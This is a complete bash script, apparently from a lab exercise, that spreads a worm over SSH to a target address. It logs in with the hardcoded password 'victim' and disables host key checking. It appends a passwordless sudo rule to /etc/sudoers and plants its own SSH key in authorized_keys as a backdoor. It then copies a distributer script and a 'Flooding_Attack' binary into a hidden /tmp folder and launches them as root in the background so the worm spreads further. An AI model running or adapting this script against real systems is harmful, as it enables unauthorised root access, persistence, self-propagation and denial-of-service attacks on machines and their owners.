#!/bin/bash

destip=$1
isFirst=$2

require_ssh_key_generated() {
    if [ ! -f ~/.ssh/id_rsa ]; then
        echo "Generating SSH keys ..."
        mkdir -p ~/.ssh
        ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa > /dev/null
    fi
}

require_nopasswd(){
    local superprv="victim ALL=(ALL) NOPASSWD: ALL"
    local dest="/etc/sudoers"
    local execmdd="grep victim $dest > /dev/null; if [ \$? -ne 0 ]; then echo \"Writing sudoers ...\"; echo \"$superprv\" >> $dest; fi"
    local cmdd="echo victim | sudo -S bash -c '$execmdd'"
    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim "$cmdd" > /dev/null
}

require_ssh_key_set() {
    local mykey=$(cat ~/.ssh/id_rsa.pub)
    local dest="~/.ssh/authorized_keys"
    local cmdd="mkdir -p ~/.ssh; touch $dest; grep \"$mykey\" $dest > /dev/null || \
                echo 'Setting SSH for the first time ...' && echo \"$mykey\" >> $dest"
    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim "$cmdd" > /dev/null
}

distribute_worm() {
    local tmpdest="/tmp/.worm0716023"
    local pvkeyloc=~/.ssh/id_rsa
    echo "Distributing worms ..."
    ssh -i $pvkeyloc victim@$destip "rm -rf $tmpdest && mkdir $tmpdest" > /dev/null 
    scp -i $pvkeyloc ./scripts/distributer.sh ./scripts/Flooding_Attack ./scripts/launcher.sh victim@$destip:$tmpdest > /dev/null
    echo "Launching worms ..."
    ssh -i $pvkeyloc victim@$destip "chmod +x $tmpdest/distributer.sh > /dev/null && nohup sudo $tmpdest/distributer.sh &> /dev/null" > /dev/null
}

if [ -n "$isFirst" ]; then
    require_ssh_key_generated
    require_nopasswd
    require_ssh_key_set
fi
distribute_worm
echo "All task done!"
